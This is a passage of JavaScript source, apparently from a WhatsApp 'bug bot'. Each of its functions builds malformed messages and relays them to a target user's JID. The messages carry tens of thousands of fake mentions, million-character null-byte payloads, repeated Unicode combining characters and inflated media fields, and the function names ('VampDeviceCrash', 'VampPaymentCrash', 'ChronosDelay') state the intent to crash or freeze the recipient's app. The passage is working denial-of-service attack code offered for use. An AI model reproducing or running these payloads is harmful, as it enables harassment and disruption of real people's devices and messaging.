          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 25000 }, () =>
                  `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
                        }
                    }, {});
                  }

  
async function protocol7(sock, jid, mention) {
  const floods = 50000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, messageContent, { userJid: jid });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: jid }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " 𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 "
        },
        content: undefined
      }]
    });
  }
}

async function protocolbug8T(sock, jid, mention) {
  const photo = {
    image: imgCrL,
    caption: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
  };

  const album = await generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: jid,
    upload: client.waUploadToServer
  });

  await sock.relayMessage(jid, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(jid, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "𐍃𐌍𐌉𐌕𐌂𐌇",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(jid, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function SnitchDelayVolteX(sock, jid) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    // === BAGIAN PERTAMA: Radiactive ViewOnce + Sticker ===
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
        fileLength: "5945180",
        seconds: 17,
        mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
        height: 1280,
        width: 720,
        fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
        directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const radMsg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    const radMsg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", radMsg1.message, {
        messageId: radMsg1.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", radMsg2.message, {
        messageId: radMsg2.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    // === BAGIAN KEDUA: protoTagFreezeCombo ===
    const comboMsg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: "0@s.whatsapp.net ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "0@s.whatsapp.net",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TRIGGER SYSTEM",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", comboMsg.message, {
        messageId: comboMsg.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.sendMessage(jid, {
        text: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        mentions: mentionedList
    });
}


        async function delayresponse(sock, jid) {
const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 1e15)}@s.whatsapp.net`
  )
];
    
  const message = {
    buttonsResponseMessage: {
      selectedButtonId: "ោ៝".repeat(10000),
      selectedDisplayText: "ExploiterX",
      contextInfo: {
        mentionedJid: mentionedList,
          quotedMessage: {
              message: {
                text: "A M E L I A IS RUN",
                footer: "XxX",
                buttons: [{
                    buttonId: `🚀`, 
                    buttonText: {
                        displayText: '~𑇂𑆵𑆴𑆿'.repeat(5000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
          },          
      },
      type: 1
    }
  };

  const protoMessage = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message
    }
  }, {});

  await sock.relayMessage("status@broadcast", protoMessage.message, {
            messageId: protoMessage.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }
    
        async function ChronosDelay(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const letakx = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Xrelly Mp5",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Xrelly Mp5"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ARE YOU KIDDING ME?!!!",
        title: "Xrl",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const xaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { xletak } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, xaudio, {});
  
    for (const msg of [msg1, msg2]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           

async function protocol8(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇" + "ោ៝".repeat(20000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/snitch",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                content: undefined
            }]
        });
    }
}        



async function VampPaymentCrash(jid, Ptcp = true) {
    await sock.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "A m e l i a.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: jid }});
}
        
async function VampDeviceCrash(sock, jid) {
    await sock.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Vampire",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: jid}});
}
async function VampDelayMess(sock, jid) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Vampire Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Vampire Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
